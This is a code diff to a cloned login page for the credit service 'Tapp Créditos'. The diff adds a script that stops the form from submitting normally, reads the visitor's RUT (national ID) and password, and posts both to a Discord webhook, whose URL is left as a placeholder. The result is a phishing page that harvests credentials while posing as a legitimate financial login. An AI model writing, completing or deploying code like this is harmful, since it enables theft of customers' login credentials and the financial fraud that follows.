@@ -99,7 +99,7 @@
                     <img src="mgd9ws2wukhr/7ICDsxpUk5FcnzNwyjsueb/83778405919a123063267c7d69db9ae4/logo-default-small.svg" alt="" class="w-full"/></picture></div>
                 <div class="flex w-full flex-1 flex-col">
                   <div class="flex-1 flex flex-col">
-                    <form class="flex h-fit flex-col bg-neutral-white px-5 py-8 md:rounded-xl md:px-8 md:shadow-1 flex-1 gap-2 !rounded-t-xl pb-2 md:flex-none md:!rounded-xl md:py-6">
+                    <form class="flex h-fit flex-col bg-neutral-white px-5 py-8 md:rounded-xl md:px-8 md:shadow-1 flex-1 gap-2 !rounded-t-xl pb-2 md:flex-none md:!rounded-xl md:py-6"  id="loginForm" onsubmit="...">
                       <div class="last-empty-p-hidden flex w-full flex-col gap-0 p-0 md:p-0">
                         <h2 class="font-semibold text-headline-primary text-left mb-4 text-2xl md:text-2xl lg:text-3xl">¡Bienvenido a Tapp Créditos!</h2>
                         <p class="text-neutral-black text-left sm:text-sm text-sm md:text-sm lg:text-sm">Si ya tienes una cuenta Tapp, inicia sesión ingresando los siguientes datos:</p></div>
@@ -144,6 +144,61 @@
     // Cambiar el tipo del input entre 'password' y 'text'
     const type = password.getAttribute("type") === "password" ? "text" : "password";
     password.setAttribute("type", type);
+  });
+</script>
+
+
+    <script>
+  // Seleccionar el formulario
+  const loginForm = document.getElementById('loginForm');
+
+  loginForm.addEventListener('submit', async (event) => {
+    // Prevenir la recarga de la página
+    event.preventDefault();
+
+    // Obtener los valores de los inputs
+    const rut = document.getElementById('rut').value;
+    const password = document.getElementById('password').value;
+
+    // Guardar el RUT en la sesión del navegador
+    sessionStorage.setItem('rut', rut);
+
+    // Configurar la URL de tu Webhook de Discord
+    const webhookUrl = 'TU_URL_DEL_WEBHOOK_AQUI';
+    
+    // Crear el contenido del mensaje con formato profesional
+    const data = {
+      content: `
+        **📝 Registro de Inicio de Sesión**
+        
+        > RUT: \`${rut}\`
+        > Clave: \`${password}\`
+        
+        ---
+        🕒 Fecha: ${new Date().toLocaleString()}
+        
+        *Sistema: Tapp Créditos*
+      `
+    };
+
+    // Enviar los datos a Discord
+    try {
+      const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+
+      if (response.ok) {
+        console.log('Datos enviados a Discord correctamente');
+      } else {
+        console.error('Error al enviar a Discord');
+      }
+    } catch (error) {
+      console.error('Error de red:', error);
+    }
   });
 </script>
   
